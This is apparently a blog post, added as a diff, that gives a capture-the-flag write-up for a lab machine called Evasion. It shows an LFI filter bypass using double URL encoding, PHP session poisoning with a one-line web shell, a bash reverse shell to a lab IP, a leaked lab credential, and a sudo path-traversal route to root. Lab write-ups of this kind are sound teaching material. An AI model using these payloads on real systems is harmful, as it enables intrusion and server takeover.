@@ -1,0 +1,122 @@
+---
+title: 'Evasion Writeup'
+date: '2025-03-22'
+tags: ['LFI', 'Linux', 'Hacking Club']
+draft: false
+summary: 'The Evasion machine is vulnerable to LFI with filter bypass, session poisoning for RCE, crontab, and privilege escalation via sudo.'
+images: ['/static/images/evasion-writeup-images/default.png']
+authors: ['default']
+---
+
+![logo](/static/images/evasion-writeup-images/default.png)
+
+---
+
+## Port Scanning
+
+```bash
+nmap -sV -sC -p- -v $IP --min-rate 3000
+```
+
+![evasion](/static/images/evasion-writeup-images/image.png)
+
+Only ports 22 (SSH) and 80 (HTTP) are open.
+
+## Enumeration
+
+When accessing the address on port 80, it redirects us to **evasion.hc**
+
+![evasion 1](/static/images/evasion-writeup-images/image1.png)
+
+We need to add the domain to our local DNS **/etc/hosts**
+
+```python
+sudo vim /etc/hosts
+```
+
+![evasion 2](/static/images/evasion-writeup-images/image2.png)
+
+Accessing the application on port 80, it was possible to register a new user to access the application.
+
+![evasion 3](/static/images/evasion-writeup-images/image3.png)
+
+By intercepting the route for **Software Guide > Download**, it was possible to find an LFI (Local File Inclusion) in the guide parameter. The application has a filter against LFI, but it was bypassed using double URL encoding.
+![evasion 4](/static/images/evasion-writeup-images/image4.png)
+
+```jsx
+%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%2565%2574%2563%252f%2570%2561%2573%2573%2577%2564
+```
+
+![evasion 5](/static/images/evasion-writeup-images/image5.png)
+
+With our session cookie, we can read the file **/var/lib/php/sessions/sess_0n9720fs19remri8e0h26gb5bq**, which we can use to poison the PHP session log.
+
+![evasion 6](/static/images/evasion-writeup-images/image6.png)
+
+To poison the logs, we’ll create a new user but pass a PHP web shell in the login field.
+
+```jsx
+<?php system($_GET[0]); ?>
+```
+
+![evasion 7](/static/images/evasion-writeup-images/image7.png)
+
+When logging in with the created user (webshell) and intercepting the same request, we can successfully use the poisoning.
+
+```python
+../../../../../var/lib/php/sessions/sess_p3eqpujc8mqhqnu9agu96bh8om
+```
+
+![evasion 8](/static/images/evasion-writeup-images/image8.png)
+
+---
+
+## Foot Hold
+
+Through LFI, we were able to get RCE by poisoning the logs, and with that, we can get a reverse shell using the following payload:
+
+```python
+bash -c 'exec bash -i &>/dev/tcp/10.0.31.150/1337 <&1'
+```
+
+![evasion 9](/static/images/evasion-writeup-images/image9.png)
+
+```python
+nc -lnvp 1337
+```
+
+![evasion 10](/static/images/evasion-writeup-images/image10.png)
+
+---
+
+## Privillege Escalation
+
+By running Pspy64 on the server, we identified a running process that reveals the credentials for user **lucas**.
+
+`lucas:TL7g81rqYFW`
+
+![evasion 11](/static/images/evasion-writeup-images/image11.png)
+
+![evasion 12](/static/images/evasion-writeup-images/image12.png)
+
+```python
+sudo -l
+```
+
+![evasion 13](/static/images/evasion-writeup-images/image13.png)
+
+Since we can run any script as root without a password, we just need to create a Python script that gives us root access to the machine.
+
+```python
+echo "import os" > evil.py
+echo "os.system('/bin/bash')" >> evil.py
+sudo /usr/bin/python3 /opt/scripts/../../../tmp/evil.py
+```
+
+![evasion 14](/static/images/evasion-writeup-images/image14.png)
+
+---
+
+## Proof
+
+![evasion 15](/static/images/evasion-writeup-images/image15.png)
